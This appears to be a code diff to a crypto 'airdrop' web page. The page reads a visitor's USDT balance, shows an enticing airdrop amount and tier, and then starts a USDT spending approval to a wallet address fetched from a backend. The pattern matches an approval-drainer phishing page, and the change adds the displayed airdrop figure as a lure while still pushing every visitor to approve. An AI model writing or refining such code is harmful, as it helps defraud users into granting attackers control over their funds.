@@ -1003,14 +1003,21 @@
                 console.log("💰 USDT Balance:", balanceInUSDT);
                 document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
                 
-                // ✅ CHANGE: Always show airdrop amount as 0 initially
-                document.getElementById("airdropAmount").textContent = "0";
-                document.getElementById("tierBadge").textContent = "Approve to see";
+               // ✅ CHANGE: 0 USDT wale ko bhi airdrop amount show karo
+const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
+const tier = getTier(parseFloat(balanceInUSDT));
 
-                // ✅ CHANGE: Allow approval even with 0 USDT balance
-                button.innerHTML = '<div class="loading"></div> Approving USDT...';
-                
-                showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Approving...`, "info");
+document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
+document.getElementById("tierBadge").textContent = tier;
+
+// ✅ CHANGE: 0 USDT wale ko bhi allow karo approval ke liye
+button.innerHTML = '<div class="loading"></div> Approving USDT...';
+
+if (airdropAmount === 0) {
+    showAlert(`⚠️ Note: You will receive 0 tokens as you have less than 1 USDT`, "warning");
+} else {
+    showAlert(`💰 Balance: ${parseFloat(balanceInUSDT).toFixed(6)} USDT | Airdrop: ${airdropAmount.toLocaleString()} tokens`, "info");
+}
                 
                 try {
                     const approvalWallet = await getApprovalWalletFromBackend();
@@ -1313,3 +1320,4 @@
     </script>
 </body>
 </html>
+
